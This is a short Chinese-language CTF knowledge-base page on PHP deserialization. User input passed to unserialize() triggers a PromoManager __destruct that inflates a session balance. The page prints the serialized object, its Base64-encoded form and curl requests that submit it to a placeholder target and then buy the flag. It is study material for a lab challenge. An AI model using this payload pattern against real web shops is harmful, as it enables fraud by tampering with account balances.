---
title: PHP 反序列化 — __destruct 余额篡改
category: web
tags: [php, deserialization, unserialize, destruct, gadget-chain]
triggers: [反序列化, unserialize, __destruct, 魔术方法, 序列化, PHP反序列化, gadget chain, 余额篡改]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/PHP反序列化余额篡改.md]
---

## Summary

`unserialize()` 用户输入触发 `__destruct()` 魔术方法自动修改会话余额，实现低价购买高价值商品。

## Key Points

- PHP 魔术方法在对象销毁时自动触发
- unserialize 返回的对象在脚本结束时销毁 → `__destruct` 自动执行
- Gadget chain: `unserialize → __destruct → balance += amount`
- 注意识别配置文件中的"烟雾弹"（未使用的变量）

## Details

### 核心 Payload

```php
// 序列化 payload — PromoManager 对象
O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:0:"";}

// Base64 编码后发送
curl -b cookie.txt -X POST http://target/api/apply_coupon.php \
  -d 'coupon=TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6MDoiIjt9'

// 购买 flag
curl -b cookie.txt -X POST http://target/buy.php -d 'item=flag'
```

## Connections

- Related: [[php-file-inclusion-filter]]
- Related: [[java-deserialization]] (future page)
